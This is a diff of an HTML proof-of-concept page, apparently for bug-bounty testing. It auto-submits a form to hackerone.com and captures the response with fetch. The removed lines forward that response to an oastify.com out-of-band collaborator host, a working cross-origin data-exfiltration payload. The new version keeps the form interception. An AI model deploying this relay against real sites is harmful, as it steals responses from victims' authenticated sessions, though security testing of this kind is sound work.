@@ -1,45 +1,40 @@
 <html>
   <body>
-    <form id="myForm" method="POST" action="https://hackerone/stories-of-2024/new">
+    <form id="myForm" method="POST" action="https://hackerone.com/stories-of-2024/new">
       <input type="submit" value="Submit request" />
     </form>
 
     <script>
-      // Intercept the form submission
-      document.getElementById("myForm").onsubmit = function (event) {
-        //event.preventDefault();  // Prevent the default form submission
+      // Intercept the form submission to capture the response
+      document.getElementById("myForm").onsubmit = function(event) {
+        event.preventDefault();  // Prevent the form from submitting the usual way
 
-        // Create FormData object to capture the form data
+        // Create a FormData object to gather the form data
         const formData = new FormData(document.getElementById("myForm"));
 
-        // Perform the first fetch request (submit the form to the specified action)
-        fetch("https://hackerone/stories-of-2024/new", {
+        // Send the form data using fetch
+        fetch("https://hackerone.com/stories-of-2024/new", {
           method: "POST",
           body: formData,
         })
-          .then((response) => response.json())  // Assuming the response is JSON
-          .then((data) => {
-            console.log("Response from first request:", data);
+        .then((response) => {
+          if (!response.ok) {
+            // Handle any HTTP errors (e.g., 404, 500)
+            throw new Error("Network response was not ok");
+          }
+          return response.json();  // Parse the response as JSON (adjust based on your server's response format)
+        })
+        .then((data) => {
+          // Capture and process the response data
+          console.log("Response data:", data);
 
-            // Store the response in a variable for later use
-            const responseData = data;  // Modify this according to your response structure
-
-            // Now use the response data to send to another endpoint
-            return fetch("https://6bihv154h3l4h09rv9kkonfprgx7lz9o.oastify.com/", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json", // Assuming you're sending JSON data
-              },
-              body: JSON.stringify({ response: responseData }),
-            });
-          })
-          .then((secondResponse) => secondResponse.json())  // Handle the second response
-          .then((secondData) => {
-            console.log("Response from second request:", secondData);
-          })
-          .catch((error) => {
-            console.error("Error during the requests:", error);
-          });
+          // Now you can use the response data in further logic
+          // For example, you can use it to send a request to another endpoint
+        })
+        .catch((error) => {
+          // Handle any errors during the fetch request
+          console.error("There was a problem with the fetch operation:", error);
+        });
       };
 
       // Optionally, trigger the form submission automatically (you can remove this if not needed)
